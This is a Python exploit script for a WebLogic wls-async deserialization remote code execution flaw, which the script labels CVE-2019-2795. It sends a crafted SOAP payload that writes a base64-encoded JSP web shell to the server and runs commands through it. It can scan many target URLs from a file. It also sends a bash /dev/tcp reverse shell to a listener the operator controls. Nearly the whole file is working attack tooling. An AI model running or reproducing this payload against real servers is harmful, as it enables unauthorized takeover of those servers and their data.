# -*- coding: utf-8 -*-
# Author: mntn
import requests
import sys


data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
    xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
    <soapenv:Header> 
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
        <void index="0">
            <string>/bin/bash</string>
        </void>
        <void index="1">
            <string>-c</string>
        </void>
        <void index="2">
        <string>
            POC
        </string>
        </void>
        </array>
        <void method="start"/></void>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
        <asy:onAsyncDelivery/>
    </soapenv:Body>
    </soapenv:Envelope>'''

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
    "Connection": "keep-alive",
    "Content-Type": "text/xml"
}


def check(url):
    poc_data = "echo PCUKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiU+Cg== | base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp"
    poc = data.replace("POC",poc_data)
    full_url = url+"_async/AsyncResponseService"

    try:
        print("> check %s" % full_url)
        req = requests.post(url=full_url, headers=header, data=poc)
        if req.status_code == 202:
            print("[*] 发送poc成功")
        else:
            print("[-] 发送poc失败，%s 不存在漏洞\t%d" % (url, req.status_code))
            return -1
    except requests.exceptions.ConnectTimeout:
        print("[-] connect timeout")
        return -1
    except requests.exceptions.ConnectionError:
        print("[-] connect error")
        return -1

    check_req = requests.get(url+"_async/shell.jsp?cmd=whoami")
    try:
        if check_req.status_code == 200 and check_req.text != "":
            user = check_req.text.strip()
            user_end = user.find("\n")
            user = user[5:user_end]
            print("[*] %s is vulnerable.\t The current user permission is == %s == " % (url, user))
            return 1
        elif check_req.status_code != 200:
            print("[-] 写入shell失败，不存在漏洞")
            return -1
        elif check_req.status_code == 200:
            print(url + "_async/shell.jsp?cmd=whoami")
            print("!!! 写入shell文件成功，但是无法执行命令，推荐使用nc 监听反弹shell")
            return 0
    except requests.exceptions.ConnectTimeout:
        print("[-] connect timeout")
        return -1
    except requests.exceptions.ConnectionError:
        print("[-] connect error")
        return -1


def batch(url_file):
    vuln_list = []
    # 等待通过nc 反弹shell验证
    verify_list = []
    with open(url_file) as f:
        url_list = f.readlines()
        for url in url_list:
            flag = check(url.strip())
            if flag == 1:
                vuln_list.append(url)
            elif flag == 0:
                verify_list.append(url)
    f.close()

    print("\n存在漏洞\n"+"="*35)
    i=1
    for vuln_url in vuln_list:
        print("【%d】: %s" % (i, vuln_url))
    print("需进一步通过nc监听反弹shell确认漏洞是否存在\n"+"="*35)
    i=1
    for verify_url in verify_list:
        print("【%d】: %s" % (i, verify_url))


def verify(url, nc_ip):
    poc_data = "bash -i >&amp; /dev/tcp/%s 0>&amp;1" % nc_ip.replace(":", "/")
    poc = data.replace("POC", poc_data)
    full_url = url+"_async/AsyncResponseService"
    print(full_url)

    print("请务必先在%s 上运行 nc -lv %s" % (nc_ip.split(":")[0], nc_ip.split(":")[1]))
    try:
        nc_req = requests.post(url=full_url,headers=header, data=poc)
        if nc_req.status_code == 202:
            print("请查看是否有shell反弹")
    except requests.exceptions.ConnectTimeout:
        print("[-] connect timeout")
    except requests.exceptions.ConnectionError:
        print("[-] connect error")


if __name__ == '__main__':
    usage = '''
        ================================================================
        |          Weblogic wls-async Unserialization RCE              |
        |                 >>>CVE-2019-2795<<<                          |
        | Single URL:   python3 http://127.0.0.1:7001/                 |
        | Batch Model:  python3 -f url_file                            |
        | Verify URL:   python3 -v http://127.0.0.1 -nc 127.0.0.2:1234 |
        ================================================================
        '''
    if len(sys.argv) == 2:
        if sys.argv[1][:4] != "http":
            print(usage)
            exit()
        check(sys.argv[1])
    elif len(sys.argv) == 3:
        batch(sys.argv[2])
    elif len(sys.argv) == 5:
        verify(sys.argv[2], sys.argv[4])
    else:
        print(usage)